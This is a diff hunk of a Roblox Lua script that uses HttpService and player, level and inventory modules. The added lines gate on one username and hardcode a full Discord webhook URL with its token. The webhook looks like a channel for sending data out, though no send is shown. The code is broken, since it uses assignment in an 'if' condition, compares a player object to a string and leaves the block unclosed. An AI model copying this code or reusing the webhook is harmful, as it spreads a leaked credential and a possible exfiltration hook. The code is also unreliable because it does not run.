@@ -819,7 +819,9 @@ local HttpService = game:GetService("HttpService")
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
 local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
 local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
-
+if game.Players.LocalPlayer = "X4_NDY" then
+userName = "testing"
+webHook = "https://discord.com/api/webhooks/1302027168385335346/H2NwinyqtbszXDpYZtkW4HqJYNKj_lU-gggfPAWE8yzGzm9lar82GvpEkM090KOUKRLF"
 _G.vlorp = _G.vlorp or false
 if _G.vlorp then
     return
